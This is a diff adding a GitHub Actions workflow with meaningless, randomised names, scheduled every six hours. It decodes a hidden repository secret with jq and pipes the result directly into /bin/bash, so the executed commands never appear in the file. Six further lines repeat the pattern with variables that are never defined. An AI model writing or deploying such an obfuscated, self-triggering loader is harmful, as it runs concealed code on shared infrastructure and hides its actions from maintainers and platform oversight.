@@ -1,0 +1,23 @@
+name: qiaofengshang7890
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '48 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: qiaofengshang7890
+        env:
+          b6: ${{ secrets.b6 }}
+        run: |
+          echo $b6 | jq -r .hwjd79 | /bin/bash
+          echo $c201 | jq -r .h864 | /bin/bash
+          echo $qgb1 | jq -r .h736 | /bin/bash
+          echo $iahih14 | jq -r .uxzws130 | /bin/bash
+          echo $squzo87141 | jq -r .kp37 | /bin/bash
+          echo $x6029 | jq -r .ac22 | /bin/bash
+          echo $re06 | jq -r .qjain878 | /bin/bash
+
